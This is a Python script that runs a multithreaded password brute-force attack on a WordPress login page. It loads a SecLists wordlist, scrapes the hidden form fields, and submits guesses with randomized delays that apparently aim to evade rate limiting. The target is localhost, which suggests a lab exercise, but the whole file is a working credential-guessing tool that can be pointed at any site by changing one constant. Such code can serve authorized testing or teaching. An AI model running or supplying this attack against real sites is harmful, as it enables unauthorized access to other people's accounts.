from queue import Queue
from lxml import etree
from io import BytesIO

import threading
import requests
import time
import random

WORDLIST = '/home/kali/repos/SecLists/Passwords/Software/cain-and-abel.txt'
TARGET = 'http://localhost/wp-login.php'
SUCCESS = "Welcome to WordPress!"
THREADS = 9

def get_words():
	with open(WORDLIST) as f:
		raw_words = f.read()

	words = Queue()
	for word in raw_words.split():
		words.put(word)

	return words

def get_params(content):
	params = dict()
	parser = etree.HTMLParser()
	tree = etree.parse(BytesIO(content), parser=parser)
	for element in tree.findall('//input'):
		name = element.get('name')
		if name is not None:
			params[name] = element.get('value', None)
	
	return params

class Bruter:
	def __init__(self, username, url):
		self.username = username
		self.url = url
		self.found = False
		print(f'Brute Force Attack beginning on {url}.')
		print("Set up with username = %s." % username)

	def run_bruteforce(self, passwords):
		for _ in range(THREADS):
			t = threading.Thread(target=self.web_bruter, args=(passwords,))
			t.start()

	def web_bruter(self, passwords):
		session = requests.Session()
		resp0 = session.get(self.url)
		params = get_params(resp0.content)
		params['log'] = self.username

		while not passwords.empty() and not self.found:
			time.sleep(random.uniform(2.99, 8.22))
			passwd = passwords.get()
			print(f'Trying username:password {self.username}:{passwd:<10}')
			params['pwd'] = passwd

			try:
				resp1 = session.post(self.url, data=params)

				if SUCCESS in resp1.content.decode():
					self.found = True
					print(f'\nBruteforcing successful.')
					print("Username is %s" % self.username)
					print("Password is %s\n" % passwd)
					print('done: now cleaning up other threads.')
			except requests.exceptions.ConnectionError:
				print(f'Connection problem, putting {passwd} back in the queue.')
				passwords.put(passwd)


if __name__ == '__main__':
	words = get_words()
	b = Bruter('user', TARGET)
	b.run_bruteforce(words)
